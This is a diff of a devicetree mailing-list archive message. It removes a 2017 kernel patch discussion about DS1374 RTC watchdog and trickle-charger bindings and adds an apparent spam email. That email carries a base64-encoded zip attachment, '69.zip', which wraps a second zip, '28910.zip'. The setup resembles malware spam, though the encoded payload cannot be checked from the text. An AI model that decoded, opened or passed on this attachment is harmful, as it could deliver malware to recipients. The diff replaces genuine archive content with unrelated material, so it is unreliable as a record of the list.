@@ -1,73 +1,44 @@
-From: Moritz Fischer <mdf-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
-Subject: Re: [PATCH] rtc: ds1374: Add trickle charger device tree binding
-Date: Sat, 22 Apr 2017 10:54:23 -0700
-Message-ID: <CAAtXAHfNuRXninLWySAOdtV99ih4PBt=JPszn3UkNa08OvXLFQ@mail.gmail.com>
-References: <1492468810-17224-1-git-send-email-mdf@kernel.org>
- <20170420155634.gs7qkufw7j4mfqpx@rob-hp-laptop> <20170420172538.GA13892@tyrael.amer.corp.natinst.com>
+From: <sushildhimanphotography-/E1597aS9LQAvxtiuMwx3w@public.gmane.org>
+Subject: 26843 devicetree
+Date: Sat, 22 Apr 2017 18:35:34 -0000
+Message-ID: <149288613476.15557.17593297339883015232@orange.sk>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="69.zip"
+Content-Transfer-Encoding: base64
 Return-path: <devicetree-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-In-Reply-To: <20170420172538.GA13892-R0KNJUYl863z/wjs7L+eiWPmTBeX6bocVpNB7YpNyf8@public.gmane.org>
+Content-Disposition: attachment
 Sender: devicetree-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Rob Herring <robh-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
-Cc: Moritz Fischer <mdf-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>, rtc-linux <rtc-linux-/JYPxA39Uh5TLH3MbocFFw@public.gmane.org>, Devicetree List <devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Alessandro Zummo <a.zummo-BfzFCNDTiLLj+vYz1yj4TQ@public.gmane.org>, Alexandre Belloni <alexandre.belloni-wi1+55ScJUtKEb57/3fJTNBPR1lH4CV8@public.gmane.org>, Mark Rutland <mark.rutland-5wv7dgnIgG8@public.gmane.org>
+To: devicetree-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-Id: devicetree@vger.kernel.org
 
-On Thu, Apr 20, 2017 at 10:25 AM, Moritz Fischer <mdf-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org> wrote:
-> On Thu, Apr 20, 2017 at 10:56:34AM -0500, Rob Herring wrote:
->> On Mon, Apr 17, 2017 at 03:40:10PM -0700, Moritz Fischer wrote:
->> > Introduce a device tree binding for specifying the trickle charger
->> > configuration for ds1374. This is based on the code for ds13390.
->> >
->> > Signed-off-by: Moritz Fischer <mdf-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
->> > ---
->> >  .../devicetree/bindings/rtc/dallas,ds1374.txt      | 18 ++++++++
->> >  drivers/rtc/rtc-ds1374.c                           | 54 ++++++++++++++++++++++
->> >  2 files changed, 72 insertions(+)
->> >  create mode 100644 Documentation/devicetree/bindings/rtc/dallas,ds1374.txt
->> >
->> > diff --git a/Documentation/devicetree/bindings/rtc/dallas,ds1374.txt b/Documentation/devicetree/bindings/rtc/dallas,ds1374.txt
->> > new file mode 100644
->> > index 0000000..4cf5bd7
->> > --- /dev/null
->> > +++ b/Documentation/devicetree/bindings/rtc/dallas,ds1374.txt
->> > @@ -0,0 +1,18 @@
->> > +* Dallas DS1374            I2C Real-Time Clock / WDT
->>
->> Please remove from trivial-devices.txt, too. (which is moving in 4.12
->> BTW)
->
-> Ok, I'll redo this on top of b7e252fcddfa573bb1ee275b53bba6cef85671d4
-> (Documentation: devicetree: move trivial-devices out of I2C realm) then.
-
-Follow up question, right now one selects between WDT and ALARM mode with
-a CONFIG_RTC_DRV_DS1374_WDT=y statically at compile time.
-
-I'd like to add a 'dallas,mode = <DS1374_WDT>;' or
-dallas,enable-watchdog property
-to the binding, same goes for the ability to remap the WDT reset output to the
-interrupt pin (which is currently not supported, but my hardware needs this).
-
-Would be the right way to add the remapping something like
-'dallas,remap-reset-to-int' ?
-
-Ideas? This change would obviously break people's setups where they
-select one or
-the other behavior via the build time option. Is that acceptable seen
-that relying on
-build time CONFIG_FOO seems like a bad assumption to begin with?
-
-A bit of background: I currently started cleaning up a bunch of issues
-in this driver,
-like refactoring it to use the watchdog framework instead of open
-coding everything,
-make setting the timeout actually work (right now it the timeout to
-tick conversion is
-hosed).
-
-Thanks,
-
-Moritz
+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
+AVBLBQYAAAAAAQABAFsAAACpBQAAAAA=
 --
 To unsubscribe from this list: send the line "unsubscribe devicetree" in
 the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
